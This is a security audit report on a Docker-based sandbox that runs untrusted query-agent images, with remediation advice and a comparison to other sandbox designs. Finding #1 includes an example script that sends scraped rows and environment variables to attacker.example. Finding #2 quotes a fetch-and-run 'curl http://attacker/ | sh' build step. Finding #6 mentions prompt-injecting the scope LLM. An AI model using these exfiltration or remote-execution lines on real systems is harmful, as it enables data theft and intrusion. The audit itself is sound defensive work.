# Hivemind-Core Security Audit — April 2026

Investigation of the query-agent sandbox: how a malicious user-supplied
Docker image submitted via `POST /v1/query-agents/submit` is constrained from
exfiltrating data, escaping the container, draining LLM budget, or
interfering with concurrent runs. Includes a structural compare/contrast
with the `oauth3-enclave` sandbox, which solves a related problem with a
very different mental model.

All claims below cite file:line against the tree at the time of writing.
Re-verify before acting if the code has moved.

---

## Threat model

An attacker holds an API key for `/v1/query-agents/submit` and uploads a tar
archive containing a `Dockerfile` plus arbitrary source files. The hivemind
host:

1. Extracts the archive.
2. Runs `docker build` against the host's docker daemon.
3. Registers an `AgentConfig` for the resulting image.
4. Spawns an agent container, attaches it to a docker network, and starts a
   per-session "bridge server" that proxies LLM calls and exposes
   `execute_sql`/`get_schema` tools to the container.
5. The container runs to completion, the bridge stops, the container is
   removed.

Goals the operator wants the sandbox to enforce:

- **Data confinement.** The agent must not see any rows the scope function
  hasn't explicitly allowed.
- **Network confinement.** The container must not be able to exfiltrate to
  arbitrary internet hosts.
- **Host isolation.** The container must not be able to escape to the CVM
  host or interfere with other containers.
- **Budget enforcement.** LLM calls must be metered and capped.
- **Cross-tenant isolation.** Concurrent runs must not be able to read or
  influence each other.

---

## Findings

### 1. CRITICAL — Egress enforcement is disabled in production

**Status: confirmed.**

Defaults in `hivemind/config.py:28-30` are secure:

```python
docker_network_internal: bool = True
enforce_bridge_only_egress: bool = True
enforce_bridge_only_egress_fail_closed: bool = True
```

The live CVM compose file overrides both
(`deploy/phala/docker-compose.core.yaml:33-34`; same overrides are also
present in the working-tree-only `deploy/docker-compose.cvm.yaml`):

```yaml
HIVEMIND_DOCKER_NETWORK_INTERNAL: "false"
HIVEMIND_ENFORCE_BRIDGE_ONLY_EGRESS: "false"
```

`docker_runner.py:548` only installs the iptables `DOCKER-USER` rules when
`enforce_bridge_only_egress` is true. With both flags off:

- Agent containers attach to a normal NAT'd docker bridge with default
  egress, i.e. they have **arbitrary internet access**.
- The host gateway is reachable, so a container can reach any port the CVM
  exposes on `127.0.0.1` from the host's perspective. Combined with the
  postgres container running on `network_mode: host`, that includes
  postgres itself.
- The bridge server binds to `0.0.0.0` (`HIVEMIND_BRIDGE_HOST` in the same
  compose file), so any container on the docker network can reach any
  active bridge port — see finding #3.

What an attacker can do today:

```dockerfile
FROM python:3.11-slim
COPY agent.py /agent.py
CMD ["python", "/agent.py"]
```
```python
# agent.py
import os, requests
# ...do whatever queries the scope_fn allows...
requests.post("https://attacker.example/exfil",
              json={"rows": collected_rows, "env": dict(os.environ)})
```

The exfiltrated rows are limited to what the scope function let through,
so this isn't a full data dump unless the scope function is permissive.
But it does mean every privacy claim that depends on "the agent has no way
to phone home" is currently false on the deployed CVM.

**Historical context.** The deploy notes record that this was disabled
during the original CVM bring-up because the iptables binary isn't in the
`python:3.11-slim` base image and the internal network blocked the bridge
on Linux. Both are fixable: bake `iptables` into the deploy image and
make sure the bridge URL resolved by `_resolve_bridge_url` (`docker_runner.py:218`)
points to the docker network gateway, not the host's external interface.

**Severity:** the most consequential finding in the audit. Every other
defence-in-depth layer assumes this one is in place.

---

### 2. CRITICAL CONTEXT — Docker socket from the host is mounted into hivemind-core

**Status: confirmed; affects severity of every other finding.**

The architecture diagrams describe this as "Docker-in-Docker", but
`deploy/phala/docker-compose.core.yaml:50` mounts
`/var/run/docker.sock:/var/run/docker.sock` from the host into the
hivemind-core container. The same mount is present in the
working-tree-only `deploy/docker-compose.cvm.yaml`, which also extends
it to the SSH debug sidecar.

Mounting the host docker socket into a container is equivalent to giving
that container root on the host. Inside a CVM the "host" is the dstack
guest VM, so the operator already trusts the hivemind-core process, but
the implications cascade:

- Any RCE in hivemind-core inherits full docker daemon control via the
  socket. The attacker can start any image,
  bind-mount any host path, attach to any network. The "agent container
  is sandboxed" boundary doesn't survive RCE in the orchestrator.
- The `docker build` invocation at `docker_runner.py:684` runs the
  attacker's `Dockerfile` against the *real* host docker daemon. Standard
  builds aren't privileged, but `RUN curl http://attacker/ | sh` during
  build will execute attacker code with the daemon's default build-time
  privileges, with network access (the build network is separate from the
  agent runtime network and is not subject to the iptables rules in
  finding #1, even when those rules are enabled).
- BuildKit's `RUN --security=insecure` requires the daemon to be
  configured with `insecure-entitlements`. Worth confirming that the CVM
  daemon does not enable this.
- The SSH debug sidecar on port 2222 with a static password (per the
  deploy notes) shares the same docker socket. Anyone who reaches that
  port has root on the CVM.

**Mitigations to consider:**

- Use a rootless or BuildKit-in-namespace setup so the build is not
  bound to the host daemon.
- Drop the SSH sidecar from production deployments, or at minimum bind
  it to a non-routable interface and rotate the password.
- Document loudly in `AUDIT.md` that the agent-container boundary
  collapses on hivemind-core RCE.

---

### 3. MEDIUM — Bridge server binds to 0.0.0.0 with unauthenticated `/health`

`HIVEMIND_BRIDGE_HOST: "0.0.0.0"`
(`deploy/phala/docker-compose.core.yaml:32`), combined with
`network_mode: host` and `internal=false`, means each ephemeral bridge
server (one per agent run) is reachable from any container on the docker
network and from any IP that can route to the CVM's external interface.

Per-session isolation primitives are in place:

- Each `BridgeServer` gets a random urandom port via `uvicorn.Config(port=0)`
  (`bridge.py:642`).
- Each session has a 32-byte `secrets.token_urlsafe` token, validated with
  `secrets.compare_digest` (`bridge.py:324-334`).
- `_enforce_scope_query_agent` (`bridge.py:336`) confines a scope session
  to its declared query-agent target.

But `/health` is unauthenticated and leaks the budget summary
(`bridge.py:346-348`):

```python
@app.get("/health")
async def health():
    return {"status": "ok", "budget": bridge.budget.summary()}
```

What this enables:

- A malicious agent in run A can scan ports on the host gateway and
  enumerate active bridges for runs B, C, D.
- For each one it can read the live token/call counts. Side channel
  into other tenants' usage and timing.
- Token brute-force is infeasible (256 bits), so it can't *call* other
  bridges' tools — only enumerate them.

#### Fix

Either gate `/health` behind the session token, or trim the response to
`{"status": "ok"}` and expose budget summary on a token-gated endpoint.
Cost: trivial.

---

### 4. MEDIUM — Deferred S3 uploads bypass mediator inspection

The S3 upload endpoint (`hivemind/sandbox/bridge.py:609-631`) was recently
refactored so that calls to `/sandbox/s3-upload` *buffer* the bytes in
`bridge.pending_s3_uploads` and return a placeholder URL of the form
`s3://pending/{run_id}/{filename}` instead of uploading immediately.
The actual S3 PUT is performed in `pipeline.py` after the mediator stage
finishes, and the placeholder URL in the agent's text output is then
substituted with the real S3 URL.

The intent (per the commit message: "defer S3 uploads until after mediator
runs") sounds like it would let the mediator review uploads before they
go live. The implementation does not do that. The post-mediator block
unconditionally executes every buffered upload:

```python
# pipeline.py — post-mediator stage
if pending_uploads and s3_uploader:
    for upload in pending_uploads:
        real_url = await asyncio.to_thread(
            s3_uploader.upload_bytes,
            upload["key"], upload["data"], upload["content_type"],
        )
        if query_output:
            query_output = query_output.replace(
                upload["placeholder_url"], real_url,
            )
```

The mediator only ever sees the *text* output of the query agent, with
the placeholder URL embedded in it. It never sees the actual bytes.
After mediation, those bytes go to S3 unchanged, and the placeholder
gets rewritten to the real URL — which the mediator also did not see and
could not have decided to redact.

What this means in practice: an attacker query agent can dump arbitrary
raw rows (or anything else it gathered through the SCOPED `execute_sql`
tool) into a base64 blob, POST it to `/sandbox/s3-upload`, and the bytes
will appear in the configured bucket regardless of what the mediator
does with the text output. The mediator-as-output-firewall guarantee
that the architecture document advertises does not apply to the S3
channel.

There are two distinct gaps here:

1. **No content review.** The mediator has no opportunity to inspect or
   veto the buffered bytes. Even a maximally cautious mediator that
   refuses to emit any text still results in the upload happening.
2. **Late URL substitution.** Even if the mediator sees the placeholder
   and decides to redact it from the text output, the upload still
   happens and the bytes are still retrievable by anyone with bucket
   read access. And if the mediator passes the placeholder through, the
   real URL it's rewritten to is one the mediator never had a chance to
   inspect.

**Fixes (pick one or both):**

- Pass `pending_uploads` through the mediator agent for content review
  before the post-mediator upload loop runs. Requires a new mediator
  capability (or a separate "data mediator") that can inspect blobs.
- Cancel pending uploads if the mediator scrubs the placeholder URL out
  of the text output. Implementation: after mediation, scan
  `query_output` for each `placeholder_url` and skip uploads whose
  placeholder no longer appears.
- At minimum, document in `ARCHITECTURE.md` that the S3 channel is an
  unmediated egress path and that operators should not enable it for
  workloads where the mediator's text-firewall property is load-bearing.

---

### 5. LOW — `apply_scope_fn` subprocess timeout is dead code on the production path

`hivemind/scope.py` defines `apply_scope_fn` (an `multiprocessing.Process`
wrapper that runs `scope_fn` in a child process with `SCOPE_FN_TIMEOUT`
hard kill on overrun). However, the production SQL tool path in
`hivemind/tools.py` does **not** call `apply_scope_fn` — it invokes the
compiled scope function directly:

```python
# tools.py — execute_sql handler
if access == AccessLevel.SCOPED and scope_fn is not None:
    try:
        result = scope_fn(sql, safe_params, rows)
        ...
```

Consequence: an attacker-controlled scope function containing
`while True: pass` (or any other CPU-bound infinite loop) will hang the
worker thread executing `execute_sql` until the *outer* agent timeout
(`agent_timeout: int = 300`) reaps the entire pipeline. Multiple such
queries in succession can sustain DoS without ever tripping a faster
guard.

The compile-time AST validation in `compile_scope_fn` does run on the
production path (it's called from `pipeline.py`'s scope-resolution
stage), so the escape vectors that the AST walker rejects — dunder
attribute access, dunder string constants, forbidden builtin names,
`ClassDef`, internal-frame attributes — are all still blocked. The gap
is purely the *runtime* timeout. The protection exists in code; it just
isn't connected to the call path that needs it.

**Fix (pick one):**

- Have `tools.py` call `apply_scope_fn` instead of `scope_fn` directly,
  and thread the source string through the `Tool` construction so the
  `_source` argument is populated and the subprocess path runs.
- Or wrap the direct call site in `tools.py` with the same
  multiprocessing pattern.

The first option is cleaner because it puts the timeout in one place
and means future call sites benefit automatically.

---

### 6. NOT EXPLOITABLE — Tape replay budget bypass

Initially flagged as a possible budget-bypass vector. After tracing it,
not exploitable from the query-agent side.

The replay tape is supplied via `SimulateRequest.replay_tape` to
`/sandbox/simulate`, and that endpoint is only mounted when
`bridge.role == "scope"` (`bridge.py:510`). The query agent's bridge
never has a `/sandbox/simulate` route and never has a way to inject a
`replay_tape` into its own `BridgeServer` constructor — that parameter
is set by `SandboxBackend.run` based on the caller, which is `Pipeline`.

Replays do bypass budget at `bridge.py:286-292`, but only for sessions
that already had a tape installed at construction time. The accounting
is correct: the tape was recorded against the scope agent's budget on
its first execution; replaying it during simulation correctly does not
double-charge.

The residual concern is **scope-agent prompt injection**: if the scope
LLM can be induced to call `/sandbox/simulate` with attacker-crafted
inputs, it burns scope-agent budget but doesn't escape the budget
envelope. Mark this one mitigated.

---

### 7. Lower-severity observations

Note: the S3 upload endpoint observation that originally lived here has
been promoted to its own finding (#4) after deeper review.

- **No image cleanup on failure or after run.** `_build_and_run`
  (`server.py:843`) builds an image and registers an agent, but I didn't
  find a code path that removes the image afterwards. A long-lived CVM
  accumulates attacker-uploaded images indefinitely. Disk pressure plus
  inventory bloat. Low severity.
- **`extract_image_files`** (`docker_runner.py:736`) creates a stopped
  container and reads `/app` out via `get_archive`. Tarbomb mitigation
  (`max_archive_size=50_000_000`) is present and the streamed read uses
  a `SpooledTemporaryFile` with a 4MB memory cap. Looks correct.
- **`_safe_extract_tar`** (defined at `server.py:75`, called from
  multiple submit endpoints) handles upload archive extraction. I did
  not read it as part of this audit. Standard tar-slip checklist
  applies: rejection of `..` components, absolute paths, and symlinks.
- **No per-tenant rate limit on `/v1/query-agents/submit`.** Each call
  spawns a background `asyncio.create_task` (`server.py:817`) that
  builds a docker image. A single API key holder can fill the build
  queue, consuming CPU and disk. Low severity, but worth a semaphore.
- **`OPENAI_API_KEY`/`ANTHROPIC_API_KEY` are set to the session token in
  the container env** (`docker_runner.py:481`). This is intentional —
  the container thinks it's talking to OpenAI/Anthropic but is actually
  talking to the bridge — and the leaked token only grants access the
  agent already has. Worth a comment in the code so future readers don't
  flag it as a credential leak.
---

## Compare and contrast: oauth3-enclave

`~/projects/oauth3` solves a related problem (sandboxing untrusted
code with mediated access to secrets and APIs) with a fundamentally
different mental model. Both projects run inside Phala dstack CVMs on
Intel TDX, both derive storage keys from dstack KMS, both have a "bridge
or endowment" layer that mediates the untrusted code's access to
secrets. They diverge on the unit of trust.

### Side-by-side

| Dimension | hivemind-core | oauth3-enclave |
|---|---|---|
| **Trust unit** | A whole Docker image (any language, any binary) | A single JS function in a SES Compartment |
| **Sandbox primitive** | Linux container: cap_drop, no-new-priv, read-only fs, mem/cpu/pid limits, separate netns | SES `Compartment` with `harden()`-ed endowments — JS realm only, no OS isolation |
| **What untrusted can call** | Bridge HTTP server with `execute_sql` + `get_schema` + LLM proxy | Capability functions injected as endowments (`scoped-fetch`, custom plugins) |
| **What untrusted can't do** | Direct network (when iptables enabled), syscalls outside container, unauthorized SQL | Direct `fetch`, file I/O, env access, `process`, `require`, `globalThis` — none of these exist inside the Compartment |
| **Network confinement** | Docker network + iptables (when enabled) | No network primitive at all — all I/O *must* go through capability functions |
| **Data filter** | Compiled Python `scope_fn` (AST-validated) does post-query row filtering | `scoped-fetch` plugin enforces path globs / methods / body schemas pre-call |
| **LLM in security path** | LLMs *generate* the scope function source; `scope.py` AST-checks and `exec`s it; budget enforced via bridge | LLM (Haiku, inside the TEE) drafts capability *specs* from human intent; **no LLM-generated code at enforcement time** |
| **Human approval surface** | Operator pre-registers scope/query/mediator agents; users submit query agents under an API key | Per-intent approval flow: user approves "create issues on owner/repo" via the proxy-orchestrator UI; permit becomes a signed capability spec |
| **Persistence** | Postgres for user data + `_hivemind_query_runs` for run state | KV `store` per capability + Postgres for audit logs |
| **Storage encryption** | LUKS2 (mentioned in `ARCHITECTURE.md`) | LUKS2 + dstack KMS-derived disk key (instance-bound, `oauth3-enclave/SECURITY.md:8-25`) |
| **Replay primitive** | Tape recording — scope agent uses it to dry-run query agent during scope synthesis (`hivemind/sandbox/tape.py`) | Audit logs only, no deterministic replay |

### Key oauth3 files

- `oauth3-enclave/proxy/src/executor.ts:1-72` — SES Compartment setup,
  hardened endowments, 30s wall-clock timeout via `Promise.race`.
- `oauth3-enclave/proxy/src/plugins/scoped-fetch.ts:14-156` — capability
  generator: path glob matching, method whitelist, body schema
  enforcement, rate limits, secret injection at call time.
- `oauth3-enclave/proxy/src/plugins/custom.ts:29-43` — owner-authored
  capability code, also runs in Compartment.
- `oauth3-enclave/proxy/src/server.ts:478-514` — `/permit` flow:
  human-approved intent → trusted in-TEE LLM drafts spec → plugin
  validates → spec compiles to deterministic capability function.
- `oauth3-enclave/SECURITY.md:8-25` — LUKS2 + dstack KMS key derivation.

### Where oauth3 is structurally stronger

1. **The trust unit is much smaller.** A Compartment running a 50-line
   JS function with three injected endowments is vastly easier to audit
   than "any Docker image the user uploaded plus everything in its base
   layer." Hivemind's surface includes the Linux kernel, the docker
   daemon, every package the attacker put in their image, and the bridge
   server. oauth3's surface is the SES library, the V8 realm, and the
   capability functions you authored.

2. **Capability-oriented network access.** `scoped-fetch` lets the
   operator declare "this capability can `GET repos/*/issues` with auth
   `Bearer ${secret}`, max 10 calls/min". The agent code never sees the
   secret, never sees `fetch`, can't hit any URL outside the glob.
   Hivemind's equivalent is "the container has no network, except it
   can talk to the bridge — except in production it can also talk to
   the whole internet because the firewall is off." The oauth3 design
   is enforcement-by-construction; hivemind's depends on a separate
   layer (iptables) staying healthy at runtime.

3. **The LLM is out of the enforcement path.** This is the most
   interesting design choice. In hivemind, the LLM emits scope-function
   *source code*, an AST validator inspects it, and the result is `exec`'d
   in a restricted namespace inside the host process. The AST walker is
   currently quite thorough — dunder access, dangerous-attribute lists,
   private-attribute prefixes, format-string dunders, and dunder method
   defs are all blocked, with subprocess isolation available — but it's
   still a "deny known escapes" model and every new escape vector
   requires a new check. In oauth3 the LLM drafts a *spec* (a JSON
   document), the human reviews it, and the enforcement is a mechanical
   interpretation of the spec by hand-written code in `scoped-fetch.ts`.
   You can prompt-inject the LLM as much as you like; the worst case is
   "the spec it drafts is bad and the human approves it anyway." There
   is no code path where an LLM-generated string is `exec`'d. Hivemind,
   by contrast, calls `compile(tree, "<scope_fn>", "exec"); exec(code, ns)`
   on LLM output every single query.

### Where hivemind is structurally stronger

1. **Hivemind's threat model is harder.** It hosts arbitrary
   user-supplied analytics code that needs a real Python runtime, NumPy,
   pandas, whatever. oauth3 only hosts very small "do this API call"
   snippets. You can't reasonably SES-sandbox a 500-line pandas
   analysis; the OS-level container is the right tool when the trust
   unit has to be a real program.

2. **SQL row filtering is something oauth3 doesn't attempt.** The whole
   `AccessLevel.SCOPED` + post-query `scope_fn` row-filter pattern is
   hivemind-specific, and it's the actual privacy-preserving primitive.
   oauth3 passes complete API responses back to the agent — there's no
   equivalent of "let the agent see aggregates but not raw rows."

3. **Tape recording for replay/audit.** `hivemind/sandbox/tape.py` gives
   a deterministic re-run primitive: the scope agent uses it to dry-run
   the query agent during scope synthesis, and operators can replay
   sessions for forensic audit. oauth3 has audit logs but no replay.

4. **Per-stage budget reservation.** The mediator-budget-reserve dance
   in `pipeline.py:108-113` (carve out tokens for the mediator before
   letting the query agent loose) is small but real hardening. oauth3's
   capability rate limits are per-capability, not pipeline-aware.

### Convergence

Both projects ended up with the same shape at the highest level:

1. TEE for hardware confidentiality.
2. KMS-derived keys bound to instance/app identity.
3. A "bridge" or "endowment" layer that mediates untrusted code's access
   to secrets and the outside world.
4. Per-session credentials so a compromised untrusted unit only damages
   one session.
5. Human approval before capabilities/agents become live.

They diverged on **what "untrusted code" means**: oauth3 says "the
smallest possible JS function with the smallest possible capability
surface, and we'll have many of them"; hivemind says "a whole Docker
image because the user is doing real data analysis, and we'll harden
the container plus filter the SQL output." The oauth3 model is much
easier to audit. The hivemind model is much more expressive.

### Things hivemind could borrow from oauth3

- **Get the LLM out of the enforcement path.** Have the scope agent
  emit a *declarative* spec (JSON: "allow these tables, require GROUP
  BY on these columns, k-anonymity threshold N") that a hand-written
  interpreter applies, instead of LLM-emitted Python that gets `exec`'d.
  Lose some flexibility, gain a lot of auditability. The current AST
  blocklist is well-maintained but is a "deny known escapes" model;
  every novel escape vector means a new check.
- **Treat the bridge token as a capability, not a credential.** Per-tool
  tokens, not a single session token that grants access to everything
  via `/llm/chat` AND `/tools/execute_sql`.
- **Move the "what URLs can the agent reach" decision into the bridge
  instead of into iptables.** Then it works regardless of whether the
  operator remembered to set `internal=true`, and it works on non-Linux
  dev environments.

### Things oauth3 could borrow from hivemind

- **Tape recording.** Audit-log-only can't replay a session
  deterministically.
- **Resource limits.** oauth3's only limit is a 30s wall-clock; a
  misbehaving Compartment can spin a CPU and OOM the Node process.
  Hivemind's per-container `mem_limit` / `nano_cpus` / `pids_limit`
  pattern is the right model.

---

## Recommended next steps for hivemind

In rough priority order:

1. **Decide on egress enforcement** (finding #1). Either fix the
   iptables-in-image issue and turn enforcement back on, or move the
   network policy into the bridge so it doesn't depend on host
   firewall state.
2. **Wire `apply_scope_fn` into the `execute_sql` tool path** (finding #5).
   The subprocess timeout already exists; the production call site
   doesn't reach it. Either route `tools.py` through `apply_scope_fn`
   with the source threaded through `Tool` construction, or replicate
   the multiprocessing pattern at the direct call site.
3. **Decide whether the S3 channel needs mediator review** (finding #4).
   At minimum cancel pending uploads when the mediator scrubs the
   placeholder URL out of the text output. Better: route the buffered
   bytes through a content mediator before the upload loop runs.
4. **Gate `/health`** behind the session token, or strip the budget
   summary out of the unauthenticated response (finding #3).
5. **Document in `AUDIT.md`** that the docker-socket mount means
   hivemind-core RCE collapses the agent-container isolation boundary
   (finding #2).
6. **Audit `_safe_extract_tar`** for tar-slip and symlink handling.
7. **Add a concurrency cap** on `submit_query_agent` background builds.

The largest structural improvement, if you're willing to take it, is
**removing LLM-generated code from the enforcement path** by replacing
`scope_fn` source with a declarative spec interpreted by hand-written
Python. The current AST blocklist in `compile_scope_fn` is well-built
but is a "deny known escapes" model and will need a new check every
time a new escape vector is published; a declarative spec eliminates
that whole class of risk by construction.

---

## Appendix A: Isolation primitives — survey and starting points

This appendix is a starting-point sketch, not a full evaluation. The
goal is to map hivemind's current runc-on-host-socket model against
the alternatives we've seen in adjacent projects, so a future hardening
pass has somewhere to begin.

### A.1. The techniques

Sorted from "thinnest OS primitive" to "full hardware virtualization",
trading isolation strength for overhead and operational complexity.

| Technique | What it is | Kernel attack surface | Overhead | Notes |
|---|---|---|---|---|
| **bwrap (bubblewrap)** | Subprocess wrapper around Linux user/PID/net/mount/IPC namespaces. No daemon. Used by Flatpak. | Full host kernel | ~0 ms (just `unshare`) | Cheap, no images, no registry |
| **runc** (Docker default, what hivemind uses today) | OCI runtime: namespaces + cgroups + seccomp + capability drop | Full host kernel, narrowed by seccomp/caps | ~50 ms cold start | Mature ecosystem |
| **sysbox** | Drop-in runc replacement adding genuine user-namespace remap, syscall interception, shiftfs/idmapped mounts. Lets containers run docker/systemd inside *without* `--privileged`. | Same as runc but root-in-container is unprivileged on host | runc + small daemon overhead | "VM-grade isolation, container ergonomics" |
| **gVisor / runsc** | Userspace kernel (Sentry) re-implements the Linux ABI. Container processes never make raw syscalls to the host. | Most kernel CVEs unreachable | 2-3× slower for syscall-heavy workloads | Compatibility surface is finicky |
| **Wasmtime / Wasm** | WebAssembly module loaded into a host process with linear-memory + fuel limits. Component model adds typed interface boundaries. | None (no syscalls at all) | ~ms-level | Tools must be compiled to Wasm |
| **Firecracker / Cloud Hypervisor** | KVM microVM with stripped-down device model. Each "function" is its own kernel. | None (HW virtualization) | ~125 ms cold boot, ~5 MB overhead | AWS Lambda, Fly machines |
| **macOS sandbox-exec** | Apple's `seatbelt` policy wrapping `sandbox_init`. Per-process. | N/A (macOS only) | Negligible | Used by Smithers as fallback |

The axis that matters most for hivemind's threat model is **kernel
attack surface**. bwrap and runc both leave the host kernel reachable
from inside the sandbox — a kernel CVE is a sandbox escape. sysbox
narrows that meaningfully. gVisor, Wasm, and microVMs essentially
eliminate it.

### A.2. What adjacent projects actually do

**hivemind-core** (this repo) — `runc` via the host's docker daemon,
mounted into hivemind-core via `/var/run/docker.sock`. Network
isolation via internal docker network + iptables (currently disabled
on the live CVM, see finding #1). Resource limits via cgroups
(`mem_limit`, `nano_cpus`, `pids_limit`). Trust unit is a whole
user-supplied Docker image. TEE measurement is one-shot at deploy
time via a notarizing contract; per-container measurement is not
recorded.

**smithers** (`~/projects/smithers-repo`) — `bwrap` is the *intended*
default runtime (`src/sandbox/transport.ts:8,118`); the integration is
specified in detail at `.smithers/tickets/sandbox-remote-execution.md`
but the actual `transport.ts` execute method is currently a stub
returning success without invoking bwrap. macOS fallback uses
`sandbox-exec` with a `(deny network*)` policy
(`src/tools/bash.ts:18-40`). The trust unit is a Smithers child
workflow (a JSX/TSX subtree), not a Docker image. The most interesting
design choice is the **bundle airlock**: sandboxed work produces a
`bundle.tar.gz` containing manifest + patches + artifacts + logs
(`src/sandbox/bundle.ts:10-15`), and the parent workflow gates whether
to apply it via `reviewDiffs` (`src/sandbox/execute.ts:330-364`). No
TEE integration. No memory/CPU/seccomp limits in the current code.

**hermes-agent** (`~/projects/hermes-agent`) — Plain Docker via a
custom Python client (`tee-socket-proxy/proxy/docker_client.py`), with
per-runtime shared containers on a custom bridge network
(`hermes-attested`). User code is bind-mounted **read-only** from
`/projects/{name}/files/` (`runtimes.py:232`). Trust unit is a git
URL plus manifest. Three things stand out:

1. **Guarded docker socket.** `tee-socket-proxy/proxy/docker_proxy.py:42-44`
   denies `/containers/{id}/(exec|archive)` API calls — the daemon needs
   socket access to spawn containers but cannot inject commands into
   running containers or read paths out of them. This is a much smaller
   socket-mount surface than hivemind currently exposes.
2. **Per-container TEE measurement.** Every container lifecycle event
   (create/start/stop/remove) is JSON-serialized and posted to
   dstack's `/EmitEvent` endpoint, extending an RTMR
   (`tee-socket-proxy/proxy/audit.py:36-51`). The attestation quote a
   remote verifier sees encodes the full history of which images ran.
   Hivemind notarizes deployment but doesn't measure per-query images.
3. **No resource limits.** Memory, CPU, PIDs all unlimited; the only
   timeout is a 600 s build cap (`docker_client.py:95`).

**oauth3-enclave** (`~/projects/oauth3/oauth3-enclave`) — Already
covered in detail in the main "Compare and contrast" section above.
SES Compartment for JS, capability-only network access via
`scoped-fetch.ts`, no TEE measurement at the container level but
dstack KMS-derived disk encryption.

**ironclaw** (`https://github.com/nearai/ironclaw`) — Rust-based
self-hosted personal AI assistant. Uses a **dual-sandbox strategy**:
Wasmtime (component model) for the primary tool sandbox, with Docker
via the Bollard client as a secondary heavyweight option. Per-sandbox
filesystem policies (`ReadOnly`, `WorkspaceWrite`, `FullAccess`).
Network is **capability-based with allowlisting** — sandboxed code
has no direct egress; requests are proxied through a host-side
network proxy that enforces a domain allowlist and injects credentials
at the boundary so tool code never sees them. The `crates/ironclaw_safety/`
module does outbound leak detection (scanning for API keys / tokens
before they reach the LLM) and uses zero-width-space insertion in
closing tag sequences to prevent prompt-injection escapes from
`<tool_output>` boundaries. **No TEE.** The most distinctive choice
is the dual-layer model: cheap-to-spawn Wasm for most tools, with
Docker reserved for compute-heavy jobs.

### A.3. Side-by-side

| | hivemind-core | smithers | hermes-agent | oauth3-enclave | ironclaw |
|---|---|---|---|---|---|
| **Runtime** | runc via host docker socket | bwrap (planned) / Docker / Codeplane | runc via guarded docker socket | SES Compartment | Wasmtime + Docker (Bollard) |
| **Trust unit** | Docker image | Smithers TSX subtree | Git repo + manifest | JS function | Wasm tool / container task |
| **Network** | Docker bridge + (intended) iptables | None by default | Bridge with default egress | None — capabilities only | Proxied with domain allowlist |
| **Filesystem** | read-only rootfs + tmpfs | read-only root, writable tmpdir | read-only bind mount | None (V8 realm) | Per-sandbox policy |
| **Resource limits** | mem / CPU / PID / timeout | None yet | Build timeout only | Wall-clock only | Wasmtime fuel + memory |
| **Docker socket exposure** | Full host socket | N/A | Full socket, `exec`/`archive` denied | N/A | N/A |
| **TEE measurement** | One-shot at deploy | None | Per-container RTMR via dstack | dstack KMS chain | None |
| **Output review** | Mediator filters text only | Bundle/diff review gate | None | Capability response shaping | Leak detector + tag sanitization |

### A.4. Three directions for hivemind, in increasing scope

These are sketches, not designs. Each is meant to be a starting point
for a more detailed conversation, not a finished proposal.

**Direction 1 — Guarded socket proxy (~1 day, smallest blast-radius reduction).**

Borrow hermes-agent's pattern. Put a thin proxy in front of
`/var/run/docker.sock` that allows the operations hivemind-core actually
needs (`build`, `create`, `start`, `wait`, `logs`, `remove`, `images/*`)
and denies the rest (`exec`, `archive`, `commit`, `cp`, anything with
`HostConfig.Privileged=true`, `HostConfig.PidMode=host`, dangerous
`HostConfig.Binds` patterns). Hivemind-core mounts the proxy socket
instead of the real one. An RCE in hivemind-core can no longer trivially
break out via `exec` into a privileged sidecar or read host files via
`archive`. Doesn't address the kernel attack surface — that's still
runc — but it does remove the "RCE in hivemind-core ⇒ root on CVM
host" property that finding #2 highlights. Reference implementation in
~80 lines: `~/projects/hermes-agent/tee-socket-proxy/proxy/docker_proxy.py`.

**Direction 2 — sysbox under hivemind-core (~1 week, eliminates docker-socket finding entirely).**

Install sysbox as a runtime on the dstack guest VM. Run hivemind-core
itself under sysbox. Inside hivemind-core, run a *nested* docker
daemon — sysbox makes this work without `--privileged` because root
in the sysbox container is genuinely unprivileged on the host. The
host docker socket is no longer mounted into hivemind-core at all.
Finding #2 disappears entirely. Agent containers spawned by the
nested daemon have the same isolation properties they have today.
Operational cost: sysbox needs to be available on the dstack image,
which may or may not be allowed by your CVM provisioning. Worth
checking with Phala whether `sysbox-runc` can be installed in the
guest.

**Direction 3 — Bundle airlock for agent outputs (~1-2 weeks, addresses finding #4).**

Borrow smithers' approach. Instead of letting the query agent directly
call `/sandbox/s3-upload`, have it write to a quarantined directory in
its container. After the agent exits, hivemind-core packages
everything the agent wrote into a bundle (text output + binary blobs +
metadata) and presents the *whole bundle* to the mediator. The
mediator gets to inspect or veto each artifact, not just the text.
Approved artifacts are then released — to S3, to the response, or
wherever. This eliminates the "S3 channel bypasses mediator inspection"
gap from finding #4 by construction, and gives a foundation for
auditable per-artifact access control. Smithers' bundle format
(`~/projects/smithers-repo/src/sandbox/bundle.ts`) is a useful
reference for the manifest schema.

These three directions are roughly orthogonal and could be done in
sequence: Direction 1 is a quick win, Direction 2 is the structural
fix for the docker-socket problem, Direction 3 is the structural fix
for the unmediated-egress problem.

A separate note worth recording: **per-container RTMR measurement via
dstack** (the hermes-agent pattern) is independent of the isolation
choice and would strengthen the attestation story regardless of
runtime. ~50 lines of Python; reference at
`~/projects/hermes-agent/tee-socket-proxy/proxy/audit.py:36-51`.
